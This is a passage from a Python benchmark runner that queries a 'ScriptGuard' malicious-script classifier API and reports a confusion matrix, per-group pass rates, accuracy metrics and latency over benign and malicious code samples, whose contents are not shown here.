        f"  Samples: {len(BENIGN_SAMPLES)} benign + "
        f"{len(MALICIOUS_SAMPLES)} malicious + "
        f"{len(OBFUSCATED_MALICIOUS_SAMPLES)} obfuscated malicious "
        f"= {len(ALL_SAMPLES)} total"
    )
    print(f"{'='*70}\n")

    # Check readiness
    try:
        r = requests.get(f"{base_url}/ready", timeout=5)
        if r.status_code != 200:
            print(f"WARNING: /ready returned {r.status_code} — {r.text}")
    except requests.exceptions.ConnectionError:
        print(f"ERROR: Cannot connect to {base_url}. Start the API first.\n")
        print("  uvicorn scriptguard.api.main:app --host 0.0.0.0 --port 8000")
        sys.exit(1)

    results = []
    tp = tn = fp = fn = 0
    latencies: list[float] = []
    errors: list[str] = []

    col_w  = 44
    header = f"  {'DESCRIPTION':<{col_w}}  {'EXPECTED':<10}  {'GOT':<10}  {'PROB':>6}  {'CONF':>6}  {'MS':>6}  PASS"
    print(header)
    print("  " + "-" * (len(header) - 2))

    prev_group = ""
    for tc in ALL_SAMPLES:
        group = "obfuscated" if tc.description.startswith("obf:") else tc.expected
        if group != prev_group:
            label_map = {
                "benign":     "BENIGN",
                "malicious":  "MALICIOUS (plain)",
                "obfuscated": "MALICIOUS (obfuscated)",
            }
            print(f"\n  --- {label_map.get(group, group)} ---")
            prev_group = group

        res = classify(base_url, tc.code, threshold)
        latencies.append(res.latency_ms)

        if res.error:
            errors.append(f"{tc.description}: {res.error}")
            row = dict(
                description=tc.description, expected=tc.expected,
                got="ERROR", pass_=False, error=res.error,
                malicious_prob=None, confidence=None, latency_ms=res.latency_ms,
            )
            results.append(row)
            print(
                f"  {tc.description[:col_w]:<{col_w}}  {tc.expected:<10}  "
                f"{'ERROR':<10}  {'':>6}  {'':>6}  {res.latency_ms:>5.0f}ms  "
                f"{_col('FAIL', False)}"
            )
            continue

        correct = res.label == tc.expected
        if   tc.expected == "malicious" and res.label == "malicious": tp += 1
        elif tc.expected == "benign"    and res.label == "benign":    tn += 1
        elif tc.expected == "benign"    and res.label == "malicious": fp += 1
        elif tc.expected == "malicious" and res.label == "benign":    fn += 1

        row = dict(
            description=tc.description, expected=tc.expected, got=res.label,
            pass_=correct, malicious_prob=res.malicious_prob,
            confidence=res.confidence, latency_ms=res.latency_ms,
        )
        results.append(row)

        desc_col = (tc.description[:col_w - 3] + "...") if len(tc.description) > col_w else tc.description
        print(
            f"  {desc_col:<{col_w}}  {tc.expected:<10}  "
            f"{_col(res.label, correct):<21}  "
            f"{res.malicious_prob:>6.3f}  {res.confidence:>6.3f}  "
            f"{res.latency_ms:>5.0f}ms  "
            f"{_col('PASS', correct) if correct else _col('FAIL', False)}"
        )

        if verbose and not correct:
            print(f"    ^ misclassified: malicious_prob={res.malicious_prob:.4f}  conf={res.confidence:.4f}")

    # ---- Confusion matrix ----
    print(f"\n{'='*70}")
    print("  CONFUSION MATRIX")
    print(f"{'='*70}")
    print(f"                      Predicted MALICIOUS  Predicted BENIGN")
    print(f"  Actual MALICIOUS        TP={tp:<6}           FN={fn:<4}")
    print(f"  Actual BENIGN           FP={fp:<6}           TN={tn:<4}")

    # ---- Per-group stats ----
    plain_rows  = [r for r in results if not r["description"].startswith("obf:") and r["expected"] == "malicious"]
    obf_rows    = [r for r in results if r["description"].startswith("obf:")]
    benign_rows = [r for r in results if r["expected"] == "benign"]

    def _pass_rate(rows: list[dict]) -> str:
        valid = [x for x in rows if x.get("got") not in ("", "ERROR")]
        if not valid:
            return "N/A"
        ok = sum(1 for x in valid if x["pass_"])
        return f"{ok}/{len(valid)} ({100*ok/len(valid):.0f}%)"

    print(f"\n  Pass rate by group:")
    print(f"    Benign              : {_pass_rate(benign_rows)}")
    print(f"    Malicious (plain)   : {_pass_rate(plain_rows)}")
    print(f"    Malicious (obfusc.) : {_pass_rate(obf_rows)}")

    # ---- Metrics ----
    m = compute_metrics(tp, tn, fp, fn)
    print(f"\n{'='*70}")
    print("  METRICS")
    print(f"{'='*70}")
    print(f"  Accuracy    : {m['accuracy']:.4f}   ({tp+tn}/{m['total']} correct)")
    print(f"  Precision   : {m['precision']:.4f}   (TP / (TP+FP))")
    print(f"  Recall      : {m['recall']:.4f}   (TP / (TP+FN))  — malware detection rate")
    print(f"  Specificity : {m['specificity']:.4f}   (TN / (TN+FP))")
    print(f"  F1          : {m['f1']:.4f}")
    print(f"  MCC         : {m['mcc']:.4f}   (Matthews Correlation Coefficient)")
    print(f"  FPR         : {m['fpr']:.4f}   (False Positive Rate)")
    print(f"  FNR         : {m['fnr']:.4f}   (False Negative Rate — malware missed)")

    # ---- Latency ----
    if latencies:
        sorted_lat = sorted(latencies)
        p95 = sorted_lat[int(len(sorted_lat) * 0.95)]
        print(f"\n{'='*70}")
        print("  LATENCY  (ms per request)")
        print(f"{'='*70}")
        print(
            f"  min={min(latencies):.0f}  "
            f"median={statistics.median(latencies):.0f}  "
            f"mean={statistics.mean(latencies):.0f}  "
            f"p95={p95:.0f}  "
            f"max={max(latencies):.0f}"
        )

    # ---- Errors ----
    if errors:
        print(f"\n{'='*70}")
        print(f"  ERRORS ({len(errors)})")
        print(f"{'='*70}")
        for e in errors:
            print(f"  {e}")

    print(f"\n{'='*70}\n")
    return results


# ============================================================================
# Entry point
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description="ScriptGuard /classify benchmark v3")
    parser.add_argument("--url", default="http://localhost:8000", help="API base URL")
    parser.add_argument(
        "--threshold", type=float, default=None,
        help="Decision threshold override (0–1, default: model default)",
    )
    parser.add_argument("--verbose", action="store_true", help="Print extra info on misclassifications")
    parser.add_argument("--json-out", metavar="FILE", help="Save full results JSON to FILE")
    args = parser.parse_args()

    results = run_benchmark(args.url, args.threshold, args.verbose)

    if args.json_out:
        with open(args.json_out, "w") as f:
            json.dump(results, f, indent=2)
        print(f"Results saved to {args.json_out}")


if __name__ == "__main__":
    main()